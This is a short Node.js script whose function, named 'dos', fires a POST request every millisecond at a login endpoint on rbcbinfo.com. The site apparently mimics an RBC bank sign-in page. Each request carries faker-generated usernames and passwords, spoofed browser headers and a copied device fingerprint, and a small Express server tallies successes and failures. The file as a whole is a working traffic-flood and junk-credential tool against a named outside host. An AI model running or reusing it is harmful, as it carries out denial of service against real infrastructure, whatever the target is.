const express = require('express')
const app = express()
let success=0
let fail=0
let failed=false
async function dos() {
    if(failed){
        setTimeout(()=>{failed=false},100)
        return;
    }
    // console.log("start!")
  var request = require("request");
  var faker = require('faker');
  const userName=faker.internet.userName()
  const password=faker.internet.password()
  const userAgent=faker.internet.userAgent()
  const os=faker.hacker.noun()
  var headers = {
    authority: "rbcbinfo.com",
    "cache-control": "max-age=0",
    "sec-ch-ua":
      '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": `"${os}"`,
    "upgrade-insecure-requests": "1",
    origin: "https://rbcbinfo.com",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent":
    userAgent,
    accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    referer: "https://rbcbinfo.com/ClientSignin.htm",
    "accept-language": "EN,en;q=0.9,en-CA;q=0.8,en;q=0.7",
    cookie:
      "F100=1/WX5/2F-6fGkqLkFcS.N9LYG6foKJloaPm-jbIv1NCBA1pOmFEezmPC8YyqcL5cOY4kZ8CBUlnyxKvUQdoACINaU6qg__/GQAAAA__/S0/PB",
  };

  var dataString =
    `FromPreSignIn_SIP=Y&LANGUAGE=ENGLISH&F30=1%2CX001%2C5%2CK1%2C2%2CQ1&SST=B-AACQAZAAsALQACAA0nwg%3F%3F&F6=1&F7=S0&F21=PB&F22=HT&CHKCLICK=Y&NNAME=&RSA_DEVPRINT=version%253D1%2526pm%255Ffpua%253Dmozilla%252F5%252E0%2520%2528macintosh%253B%2520intel%2520mac%2520os%2520x%252010%255F15%255F7%2529%2520applewebkit%252F537%252E36%2520%2528khtml%252C%2520like%2520gecko%2529%2520chrome%252F96%252E0%252E4664%252E110%2520safari%252F537%252E36%257C5%252E0%2520%2528Macintosh%253B%2520Intel%2520Mac%2520OS%2520X%252010%255F15%255F7%2529%2520AppleWebKit%252F537%252E36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome%252F96%252E0%252E4664%252E110%2520Safari%252F537%252E36%257CMacIntel%2526pm%255Ffpsc%253D30%257C1440%257C900%257C835%2526pm%255Ffpsw%253D%2526pm%255Ffptz%253D%252D8%2526pm%255Ffpln%253Dlang%253Dzh%252DCN%257Csyslang%253D%257Cuserlang%253D%2526pm%255Ffpjv%253D0%2526pm%255Ffpco%253D1&username=${userName}&password=${password}&send=`;

  var options = {
    url: "https://rbcbinfo.com/rbcgi3m01.php",
    method: "POST",
    headers: headers,
    body: dataString,
  };

  function callback(error, response, body) {
    if (!error && response.statusCode == 200) {
      success++
    }else{
      fail++
      failed=true;
    }
  }

  request(options, callback);
}


    


const port = 3000

app.get('/', (req, res) => {
  res.send({success,fail})
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
setInterval(dos,1)